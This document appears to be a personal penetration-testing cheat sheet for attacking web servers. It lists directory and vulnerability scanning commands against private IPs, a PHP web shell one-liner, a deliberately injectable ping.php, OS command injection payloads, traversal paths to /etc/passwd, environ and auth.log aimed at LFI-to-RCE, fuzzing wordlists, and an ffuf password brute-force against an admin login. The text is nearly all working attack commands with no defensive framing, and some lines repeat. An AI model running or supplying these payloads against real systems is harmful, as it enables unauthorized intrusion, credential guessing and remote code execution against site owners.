# WWW Enumeration
```bash
# /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  # FEROX Default: 
feroxbuster -u http:/<IP>/ -t 100  -x "txt,html,php,asp,aspx,jsp" -v -k -n -q -e -r -o "./tcp_81_http_feroxbuster_dirbuster.txt"

whatweb --color=never --no-errors -a 3 -v http://192.168.110.201:80 2>&1 

nikto -ask=no -Tuning=x4567890ac -nointeractive -host http://<IP>:80 2>&1 | tee "./scans/tcp80/tcp_80_http_nikto.txt"

curl -sSikf http://192.168.110.201:80/robots.txt
curl -sSik http://192.168.110.201:80/
```

```bash

https://example.com/cms/ping.php

<?php system($_GET['cmd']); ?>

127.0.0.1 && whoami
ping 127.0.0.1 && whoami

ffuf -u https://example.com/cms/login.php?language=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt

wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/human-friendly/XSS-payloadbox.txt -p "127.0.0.18080HTTP" "http://127.0.0.1/?name=FUZZ"


```

### cheatsheet
```bash

# Example: https://example.com/cms/ping.php
<?php $ip = $_GET['ip']; system("ping " . $ip); ?>
# Injection Payload:
127.0.0.1 && whoami
# Injection Payload:
ping 127.0.0.1 && whoami

# Directory Traversal
../../../../etc/passwd # Linux
..\\..\\..\\..\\windows\\win.ini # Windows
../../../proc/self/environ # Environment variables (useful for LFI ➜ RCE)
../../../../var/log/auth.log # Linux log file for poisoning
#  LFI & RFI
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt
/usr/share/seclists/Fuzzing/LFI/LFI-Windows-adeadfed.txt
/usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
/usr/share/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt
/usr/share/seclists/Fuzzing/LFI/OMI-Agent-Linux.txt

ffuf -u https://example.com/cms/login.php?language=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
http://192.168.198.141:81/Admin/index.php
username=admin&password=password&login=

ffuf -u http://192.168.198.141:81/Admin/index.php?username=admin&password=FUZZ -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt  

ffuf -u https://example.com/cms/login.php?language=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt


# OS Command Injection
127.0.0.1; whoami
127.0.0.1 || whoami
127.0.0.1 | whoami
127.0.0.1 `whoami`

```

